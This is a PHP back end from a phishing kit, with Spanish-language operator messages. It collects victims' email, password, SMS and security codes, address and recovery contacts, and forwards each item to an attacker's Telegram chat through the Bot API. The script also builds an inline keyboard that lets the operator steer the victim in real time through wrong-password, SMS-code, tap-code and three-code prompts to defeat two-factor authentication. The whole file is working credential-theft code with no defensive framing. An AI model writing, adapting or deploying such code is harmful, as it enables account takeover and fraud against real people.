<?php
require_once __DIR__ . '/config.php';
header('Content-Type: application/json');

$botToken = TELEGRAM_BOT_TOKEN;
$chatId = TELEGRAM_CHAT_ID;

$session_id = $_POST['session_id'] ?? '';
$email = $_POST['stored_email'] ?? $_POST['email'] ?? '';
$action = $_POST['action'] ?? 'login';

if (empty($session_id) || empty($email)) {
    echo json_encode(['success' => false, 'error' => 'Faltan datos']);
    exit;
}

$sessionData = getSessionData($session_id);
$sessionData['email'] = $email;
$sessionData['last_action'] = $action;
$sessionData['updated'] = time();

if ($action === 'login') {
    $sessionData['password'] = $_POST['password'] ?? '';
} elseif ($action === 'sms_code') {
    $sessionData['sms_code'] = $_POST['sms_code'] ?? '';
} elseif ($action === 'security_code') {
    $sessionData['security_code'] = $_POST['security_code'] ?? '';
} elseif ($action === 'address') {
    $sessionData['address'] = $_POST['address'] ?? '';
} elseif ($action === 'recovery') {
    $sessionData['recovery_phone'] = $_POST['recovery_phone'] ?? '';
    $sessionData['recovery_email'] = $_POST['recovery_email'] ?? '';
} elseif ($action === 'three_code_selection') {
    $sessionData['three_code_selected'] = $_POST['three_code_selected'] ?? '';
}

updateSessionData($session_id, $sessionData);

$msg = "🔔 <b>Nueva Acción: $action</b>\n";
$msg .= "👤 Email: <code>$email</code>\n";
$msg .= "🔑 Session: <code>$session_id</code>\n\n";

if ($action === 'login') {
    $msg .= "🔑 Pass: <code>" . ($_POST['password'] ?? '') . "</code>\n\n";
} elseif ($action === 'sms_code') {
    $msg .= "💬 Código SMS: <code>" . ($_POST['sms_code'] ?? '') . "</code>\n\n";
} elseif ($action === 'security_code') {
    $msg .= "🔐 Código Seguridad: <code>" . ($_POST['security_code'] ?? '') . "</code>\n\n";
} elseif ($action === 'three_code_selection') {
    $msg .= "🔢 Código Seleccionado: <code>" . ($_POST['three_code_selected'] ?? '') . "</code>\n\n";
}

$msg .= "⏳ <i>Esperando tu comando...</i>";

$s = $session_id;
$keyboard = [
    'inline_keyboard' => [
        [['text' => '❌ Wrong Email', 'callback_data' => "redirect:error:$s"], ['text' => '🔑 Wrong Password', 'callback_data' => "redirect:password:$s"]],
        [['text' => '📱 Show Phone', 'callback_data' => "input:phone:$s"]],
        [['text' => '💬 SMS Code', 'callback_data' => "redirect:sms_code:$s"], ['text' => '❌ Wrong SMS', 'callback_data' => "redirect:error:$s"]],
        [['text' => '🔐 Security Code', 'callback_data' => "redirect:security_code:$s"]],
        [['text' => '🔢 Show Tap Code', 'callback_data' => "input:tap:$s"], ['text' => '🔢 Show 3 Codes', 'callback_data' => "input:three:$s"]],
        [['text' => '✅ Finish', 'callback_data' => "redirect:success:$s"]]
    ]
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$botToken/sendMessage");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'chat_id' => $chatId,
    'text' => $msg,
    'parse_mode' => 'HTML',
    'reply_markup' => json_encode($keyboard)
]));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

echo json_encode(['success' => true]);
?>